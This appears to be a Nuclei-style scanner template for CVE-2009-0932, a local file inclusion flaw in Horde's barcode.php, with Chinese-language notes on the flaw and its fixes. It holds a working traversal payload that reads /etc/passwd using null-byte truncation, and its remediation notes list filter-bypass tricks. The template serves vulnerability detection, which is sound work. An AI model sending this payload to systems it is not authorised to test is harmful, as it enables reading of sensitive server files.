id: CVE-2009-0932
info:
  name: Horde - Horde_Image::factory driver Argument LFI
  author:
  - l0ne1y
  description: |-
    Debian Horde Image.php本地文件包含漏洞


    Horde Framework是个以PHP为基础的架构，用来创建网络应用程式。

    Horde没有正确地过滤对framework/Image/Image.php脚本所传送的输入便用于包含文件，远程攻击者可以通过在Horde_Image驱动名称中设置目录遍历序列导致包含和执行任意本地文件
  severity: medium
  remediation: "官方修复方案：<br />\n 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：\n\nhttp://lists.horde.org/archives/announce/2009/000486.html\n\nhttp://lists.horde.org/archives/announce/2009/000483.html\n\nhttp://lists.horde.org/archives/announce/2009/000482.html
    \n\n临时修复方案：<br />1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断<br />2、过滤.（点）/（反斜杠）\\\\（反斜杠），编码绕过<br
    />3、禁止服务器远程文件包含<br />4、对于限制了包含文件后缀的情况，PHP版本小于5.3，php.ini magic_quotes_gpc = off，对可控参数未使用addslashes函数，满足这三个条件就可以使用%00截断。<br
    />5、问号、井号、空格绕过（远程）"
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00'
  method: GET
